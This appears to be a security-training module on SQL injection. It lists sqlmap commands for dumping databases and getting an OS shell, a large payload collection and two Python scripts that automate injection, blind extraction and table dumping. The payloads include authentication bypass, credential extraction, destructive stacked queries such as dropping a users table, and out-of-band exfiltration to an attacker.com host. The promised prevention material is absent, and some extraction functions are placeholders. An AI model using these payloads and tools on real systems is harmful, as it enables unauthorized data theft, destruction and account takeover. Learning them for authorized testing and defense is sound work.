# SQL Injection - Topics Overview

## Topic Explanation
SQL Injection is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers insert malicious SQL statements into application queries through user input fields, allowing them to view, manipulate, or delete database contents, bypass authentication, and potentially gain administrative access to the database server. This module covers various types of SQL injection including in-band, blind, and out-of-band attacks, along with detection techniques, exploitation methods, and prevention strategies.

## Articles for Further Reference
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [NIST Guidelines for Database Security](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final)

## Reference Links
- [SQLMap Documentation](http://sqlmap.org/)
- [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)

## Available Tools for the Topic

### Tool Name: SQLMap
**Description:** Automatic SQL injection and database takeover tool that automates the process of detecting and exploiting SQL injection flaws.

**Example Usage:**
```bash
# Basic SQL injection detection
sqlmap -u "http://target.com/page.php?id=1"

# Test POST parameters
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Dump specific database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --dump

# Get shell access
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

### Tool Name: jSQL Injection
**Description:** Java-based SQL injection tool with GUI interface for testing and exploiting SQL injection vulnerabilities.

**Example Usage:**
```bash
# Start jSQL Injection
java -jar jsql-injection.jar

# Configure target URL
# Select injection type
# Run automated scan
# Extract database information
```

## All Possible Payloads for Manual Approach

### Classic SQL Injection Payloads
```sql
-- Authentication bypass
admin'--
admin'/*
' OR '1'='1'--
' OR 1=1--
") OR ("1"="1
') OR ('1'='1

-- Union-based injection
' UNION SELECT 1,2,3--
' UNION SELECT null,username,password FROM users--
' UNION SELECT @@version,user(),database()--

-- Boolean-based blind injection
' AND (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--

-- Time-based blind injection
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--

-- Error-based injection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
```

### Database-Specific Payloads
```sql
-- MySQL
' AND (SELECT * FROM information_schema.tables)--
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- PostgreSQL
'; SELECT version()--
' UNION SELECT table_name FROM information_schema.tables--

-- Microsoft SQL Server
'; SELECT @@version--
' UNION SELECT name FROM sys.tables--

-- Oracle
' UNION SELECT table_name FROM all_tables--
' AND (SELECT COUNT(*) FROM user_tables) > 0--
```

### Advanced SQL Injection Techniques
```sql
-- Second-order injection
admin'; INSERT INTO users VALUES('hacker','password'); --

-- Stacked queries
'; DROP TABLE users; --
'; CREATE TABLE backdoor (id INT, command TEXT); --

-- Out-of-band injection (MySQL)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\test'))--

-- XML-based injection
' UNION SELECT extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
```

## Example Payloads

### Advanced SQL Injection Framework
```python
#!/usr/bin/env python3
import requests
import time
import string
import itertools

class SQLInjectionTester:
    def __init__(self, target_url, parameter):
        self.target_url = target_url
        self.parameter = parameter
        self.session = requests.Session()
        self.injection_point = None
        
    def test_basic_injection(self):
        """Test for basic SQL injection vulnerability"""
        payloads = [
            "'",
            "' OR '1'='1",
            "' AND '1'='2",
            "'; SELECT 1--",
            "1' OR '1'='1",
            "1' AND '1'='2"
        ]
        
        baseline_response = self.get_response("1")
        baseline_length = len(baseline_response.text)
        
        for payload in payloads:
            response = self.get_response(payload)
            
            # Check for SQL errors
            sql_errors = [
                "mysql_fetch", "mysql_error", "ORA-01756", "Microsoft OLE DB",
                "SQLServer JDBC Driver", "PostgreSQL query failed", "sqlite3.Error",
                "SQLSTATE", "syntax error", "mysql_num_rows"
            ]
            
            for error in sql_errors:
                if error.lower() in response.text.lower():
                    print(f"SQL injection detected with payload: {payload}")
                    self.injection_point = payload
                    return True
            
            # Check for significant response differences
            if abs(len(response.text) - baseline_length) > 100:
                print(f"Potential SQL injection with payload: {payload}")
                self.injection_point = payload
                return True
        
        return False
    
    def test_union_injection(self):
        """Test for UNION-based SQL injection"""
        if not self.injection_point:
            return False
        
        # Determine number of columns
        columns = self.find_column_count()
        if not columns:
            return False
        
        print(f"Found {columns} columns")
        
        # Test UNION injection
        union_payload = f"' UNION SELECT {','.join(['null'] * columns)}--"
        response = self.get_response(union_payload)
        
        if response.status_code == 200:
            print("UNION injection successful")
            
            # Try to extract database information
            info_payload = f"' UNION SELECT {','.join(['null'] * (columns-3))},@@version,user(),database()--"
            info_response = self.get_response(info_payload)
            
            if info_response.status_code == 200:
                print("Database information extracted")
                return True
        
        return False
    
    def find_column_count(self):
        """Find number of columns using ORDER BY technique"""
        for i in range(1, 20):
            payload = f"' ORDER BY {i}--"
            response = self.get_response(payload)
            
            if "unknown column" in response.text.lower() or response.status_code != 200:
                return i - 1
        
        return None
    
    def test_blind_injection(self):
        """Test for blind SQL injection"""
        if not self.injection_point:
            return False
        
        # Boolean-based blind injection
        true_payload = "' AND '1'='1'--"
        false_payload = "' AND '1'='2'--"
        
        true_response = self.get_response(true_payload)
        false_response = self.get_response(false_payload)
        
        if len(true_response.text) != len(false_response.text):
            print("Boolean-based blind SQL injection detected")
            return self.extract_data_blind()
        
        # Time-based blind injection
        time_payload = "'; WAITFOR DELAY '00:00:05'--"
        start_time = time.time()
        self.get_response(time_payload)
        end_time = time.time()
        
        if end_time - start_time > 4:
            print("Time-based blind SQL injection detected")
            return True
        
        return False
    
    def extract_data_blind(self):
        """Extract data using blind SQL injection"""
        print("Extracting database version...")
        
        version = ""
        for position in range(1, 50):
            for char in string.ascii_letters + string.digits + ".-":
                payload = f"' AND (SELECT SUBSTRING(@@version,{position},1))='{char}'--"
                response = self.get_response(payload)
                
                # Compare with known true response pattern
                if self.is_true_response(response):
                    version += char
                    print(f"Version so far: {version}")
                    break
            else:
                break  # No more characters found
        
        print(f"Database version: {version}")
        return True
    
    def is_true_response(self, response):
        """Determine if response indicates true condition"""
        # This would need to be customized based on the application
        # For now, just check response length
        true_response = self.get_response("' AND '1'='1'--")
        return len(response.text) == len(true_response.text)
    
    def get_response(self, payload):
        """Send request with SQL injection payload"""
        params = {self.parameter: payload}
        
        try:
            response = self.session.get(self.target_url, params=params, timeout=10)
            return response
        except requests.RequestException:
            return requests.Response()
    
    def automated_exploitation(self):
        """Automated SQL injection exploitation"""
        print("Starting automated SQL injection testing...")
        
        # Test for basic injection
        if self.test_basic_injection():
            print("✓ Basic SQL injection confirmed")
            
            # Try UNION injection
            if self.test_union_injection():
                print("✓ UNION injection successful")
            else:
                # Fall back to blind injection
                if self.test_blind_injection():
                    print("✓ Blind injection successful")
        else:
            print("✗ No SQL injection detected")

# Example usage
tester = SQLInjectionTester("http://vulnerable-app.com/product.php", "id")
tester.automated_exploitation()
```

### Database Enumeration Tool
```python
#!/usr/bin/env python3
import requests

class DatabaseEnumerator:
    def __init__(self, target_url, injection_point):
        self.target_url = target_url
        self.injection_point = injection_point
        self.session = requests.Session()
    
    def enumerate_databases(self):
        """Enumerate available databases"""
        print("Enumerating databases...")
        
        # MySQL/MariaDB
        mysql_payload = "' UNION SELECT schema_name,null,null FROM information_schema.schemata--"
        
        # PostgreSQL
        postgres_payload = "' UNION SELECT datname,null,null FROM pg_database--"
        
        # SQL Server
        mssql_payload = "' UNION SELECT name,null,null FROM sys.databases--"
        
        payloads = [mysql_payload, postgres_payload, mssql_payload]
        
        for payload in payloads:
            response = self.send_payload(payload)
            if response.status_code == 200:
                databases = self.extract_databases(response.text)
                if databases:
                    print(f"Databases found: {databases}")
                    return databases
        
        return []
    
    def enumerate_tables(self, database):
        """Enumerate tables in a specific database"""
        print(f"Enumerating tables in database: {database}")
        
        # MySQL
        mysql_payload = f"' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema='{database}'--"
        
        response = self.send_payload(mysql_payload)
        if response.status_code == 200:
            tables = self.extract_tables(response.text)
            print(f"Tables found: {tables}")
            return tables
        
        return []
    
    def enumerate_columns(self, database, table):
        """Enumerate columns in a specific table"""
        print(f"Enumerating columns in {database}.{table}")
        
        mysql_payload = f"' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'--"
        
        response = self.send_payload(mysql_payload)
        if response.status_code == 200:
            columns = self.extract_columns(response.text)
            print(f"Columns found: {columns}")
            return columns
        
        return []
    
    def dump_table_data(self, database, table, columns):
        """Dump data from a specific table"""
        print(f"Dumping data from {database}.{table}")
        
        column_list = ','.join(columns[:3])  # Limit to first 3 columns
        payload = f"' UNION SELECT {column_list} FROM {database}.{table}--"
        
        response = self.send_payload(payload)
        if response.status_code == 200:
            data = self.extract_data(response.text)
            print(f"Data extracted: {data}")
            return data
        
        return []
    
    def send_payload(self, payload):
        """Send SQL injection payload"""
        params = {'id': payload}
        return self.session.get(self.target_url, params=params)
    
    def extract_databases(self, response_text):
        """Extract database names from response"""
        # Implementation depends on application response format
        return ["database1", "database2"]  # Placeholder
    
    def extract_tables(self, response_text):
        """Extract table names from response"""
        return ["users", "products", "orders"]  # Placeholder
    
    def extract_columns(self, response_text):
        """Extract column names from response"""
        return ["id", "username", "password"]  # Placeholder
    
    def extract_data(self, response_text):
        """Extract actual data from response"""
        return [["1", "admin", "hash123"], ["2", "user", "hash456"]]  # Placeholder

# Example usage
enumerator = DatabaseEnumerator("http://vulnerable-app.com/product.php", "id")
databases = enumerator.enumerate_databases()

for db in databases:
    tables = enumerator.enumerate_tables(db)
    for table in tables:
        columns = enumerator.enumerate_columns(db, table)
        if columns:
            data = enumerator.dump_table_data(db, table, columns)
```